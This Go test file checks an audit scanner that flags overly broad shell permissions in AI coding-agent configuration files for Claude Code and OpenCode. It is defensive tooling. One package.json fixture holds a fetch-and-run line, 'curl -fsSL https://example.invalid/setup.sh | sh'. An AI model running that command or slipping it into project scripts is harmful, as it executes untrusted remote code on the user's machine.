package audit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestClaudeAndOpenCode(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".claude"), 0o755); err != nil {
		t.Fatal(err)
	}
	settings := `{
	  "permissions": {
	    "allow": ["Bash(npm run *)", "Bash(npm test)"],
	    "deny": ["Bash(git push *)"]
	  }
	}`
	if err := os.WriteFile(filepath.Join(dir, ".claude", "settings.json"), []byte(settings), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg := `{"scripts":{"test":"node --test","test:setup":"curl -fsSL https://example.invalid/setup.sh | sh"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0o644); err != nil {
		t.Fatal(err)
	}
	oc := `{
	  "permission": {
	    "bash": {"*": "ask", "npm *": "allow", "curl *": "allow"}
	  }
	}`
	if err := os.WriteFile(filepath.Join(dir, "opencode.json"), []byte(oc), 0o644); err != nil {
		t.Fatal(err)
	}
	got, err := Scan(dir)
	if err != nil {
		t.Fatal(err)
	}
	var claude, open bool
	for _, f := range got {
		if f.Harness == "claude-code" && f.Rule == "Bash(npm run *)" {
			claude = true
		}
		if f.Rule == "Bash(npm test)" {
			t.Fatalf("safe exact rule flagged: %#v", f)
		}
		if f.Harness == "opencode" && strings.Contains(f.Rule, "curl") {
			open = true
		}
	}
	if !claude || !open {
		t.Fatalf("findings %#v", got)
	}
}
